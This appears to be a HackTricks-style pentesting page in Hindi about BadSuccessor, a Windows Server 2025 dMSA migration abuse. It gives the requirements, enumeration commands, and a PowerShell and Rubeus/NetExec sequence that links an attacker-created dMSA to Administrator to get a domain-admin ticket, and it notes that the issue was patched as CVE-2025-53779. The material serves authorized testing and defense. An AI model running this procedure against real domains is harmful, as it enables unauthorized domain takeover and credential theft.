# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

**BadSuccessor**, **Windows Server 2025** में शुरू किए गए **delegated Managed Service Account** (**dMSA**) migration workflow का दुरुपयोग करता है। किसी dMSA को **`msDS-ManagedAccountPrecededByLink`** के माध्यम से legacy account से link किया जा सकता है और **`msDS-DelegatedMSAState`** में संग्रहीत migration states के माध्यम से आगे बढ़ाया जा सकता है। यदि कोई attacker किसी writable OU में dMSA बना सकता है और उन attributes को नियंत्रित कर सकता है, तो KDC attacker-controlled dMSA के लिए linked account के **authorization context** वाले tickets जारी कर सकता है।<sup>[[2]](#references)</sup>

व्यवहार में इसका अर्थ है कि कम privileges वाला user, जिसके पास केवल delegated OU rights हैं, एक नया dMSA बना सकता है, उसे `Administrator` की ओर point कर सकता है, migration state को पूरा कर सकता है और फिर ऐसा TGT प्राप्त कर सकता है जिसके PAC में **Domain Admins** जैसे privileged groups शामिल होते हैं।<sup>[[2]](#references)</sup>

## महत्वपूर्ण dMSA migration details

- dMSA एक **Windows Server 2025** feature है।
- `Start-ADServiceAccountMigration` migration को **started** state में सेट करता है।
- `Complete-ADServiceAccountMigration` migration को **completed** state में सेट करता है।
- `msDS-DelegatedMSAState = 1` का अर्थ है कि migration शुरू हो गया है।
- `msDS-DelegatedMSAState = 2` का अर्थ है कि migration पूरा हो गया है।
- Legitimate migration के दौरान, dMSA से superseded account को transparently replace करने की अपेक्षा की जाती है, इसलिए KDC/LSA previous account के मौजूदा access को preserve करते हैं।<sup>[[3]](#references)</sup>

Microsoft Learn यह भी बताता है कि migration के दौरान original account को dMSA से tie किया जाता है और dMSA को उन resources तक access करने के लिए design किया गया है, जिन तक old account access कर सकता था।<sup>[[3]](#references)</sup> यही security assumption BadSuccessor का दुरुपयोग करता है।<sup>[[2]](#references)</sup>

## आवश्यकताएँ

1. ऐसा domain जिसमें **dMSA मौजूद हो**, अर्थात AD side पर **Windows Server 2025** support उपलब्ध हो।
2. Attacker किसी OU में `msDS-DelegatedManagedServiceAccount` objects **create** कर सकता हो, या वहाँ equivalent broad child-object creation rights रखता हो।
3. Attacker relevant dMSA attributes को **write** कर सकता हो या अपने द्वारा बनाए गए dMSA पर पूरा control रखता हो।
4. Attacker domain-joined context से या LDAP/Kerberos तक पहुँचने वाले tunnel से Kerberos tickets request कर सकता हो।<sup>[[2]](#references)</sup>

### Practical checks

सबसे स्पष्ट operator signal domain/forest level verify करना और यह confirm करना है कि environment पहले से नए Server 2025 stack का उपयोग कर रहा है:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
यदि आपको `Windows2025Domain` और `Windows2025Forest` जैसे values दिखाई दें, तो **BadSuccessor / dMSA migration abuse** को प्राथमिकता से check करें।

आप public tooling की सहायता से dMSA creation के लिए delegated writable OUs को भी enumerate कर सकते हैं:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. ऐसे OU में एक dMSA बनाएँ जहाँ आपके पास create-child rights delegated हों।
2. **`msDS-ManagedAccountPrecededByLink`** को किसी privileged target के DN पर सेट करें, जैसे `CN=Administrator,CN=Users,DC=corp,DC=local`।
3. Migration को completed के रूप में चिह्नित करने के लिए **`msDS-DelegatedMSAState`** को `2` पर सेट करें।
4. नए dMSA के लिए एक TGT request करें और privileged services तक पहुँचने के लिए लौटाए गए ticket का उपयोग करें।<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / operational tooling के उदाहरण:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## यह privilege escalation से कहीं अधिक है

Legitimate migration के दौरान, Windows को नए dMSA से उन tickets को भी handle करवाना होता है जो cutover से पहले पिछले account के लिए जारी किए गए थे। इसी कारण dMSA-संबंधित ticket material में **`KERB-DMSA-KEY-PACKAGE`** flow के दौरान **current** और **previous** keys शामिल हो सकती हैं।<sup>[[2]](#references)</sup>

Attacker-controlled fake migration में यह behavior BadSuccessor को निम्नलिखित में बदल सकता है:<sup>[[2]](#references)</sup>

- **Privilege escalation**, क्योंकि PAC में privileged group SIDs inherit हो सकती हैं।
- **Credential material exposure**, क्योंकि previous-key handling vulnerable workflows में predecessor के RC4/NT hash के समकक्ष material expose कर सकती है।

इससे यह technique direct domain takeover के साथ-साथ pass-the-hash या व्यापक credential compromise जैसी follow-on operations के लिए भी उपयोगी बन जाती है।

## Patch status पर notes

मूल BadSuccessor behavior **सिर्फ एक theoretical 2025 preview issue नहीं है**। Microsoft ने इसे **CVE-2025-53779** सौंपा और **August 2025** में security update प्रकाशित किया।<sup>[[4]](#references)</sup> इस attack को निम्नलिखित के लिए documented रखें:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **assessments के दौरान OU delegations और dMSA exposure का validation**

सिर्फ dMSA मौजूद होने के कारण यह न मानें कि Windows Server 2025 domain vulnerable है; patch level verify करें और सावधानीपूर्वक test करें।

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
